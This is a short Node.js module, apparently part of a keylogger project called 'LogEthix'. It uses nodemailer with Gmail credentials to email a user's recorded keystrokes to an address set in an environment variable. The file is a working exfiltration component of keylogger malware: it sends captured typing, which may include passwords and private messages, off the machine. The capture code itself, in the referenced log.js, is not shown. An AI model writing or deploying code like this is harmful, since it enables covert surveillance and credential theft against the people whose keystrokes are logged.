const nodemailer = require('nodemailer');

const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: process.env.GMAILFROM,
    pass: process.env.PASSWORD,
  },
});

async function sendKeystrokeEmail(username, keysPressedText) {
  const mailOptions = {
    from: process.env.GMAILFROM,
    to: process.env.GMAILTO,
    subject: `LogEthix: Keystroke Log for ${username}`,
    text: keysPressedText,
  };

  try {
    const info = await transporter.sendMail(mailOptions);
    console.log(`📧 Email sent to ${process.env.GMAILTO}:`, info.response);
  } catch (error) {
    console.error('❌ Email sending failed:', error.message);
    throw error; // Allow upstream handling in log.js
  }
}

module.exports = {
  sendKeystrokeEmail,
};
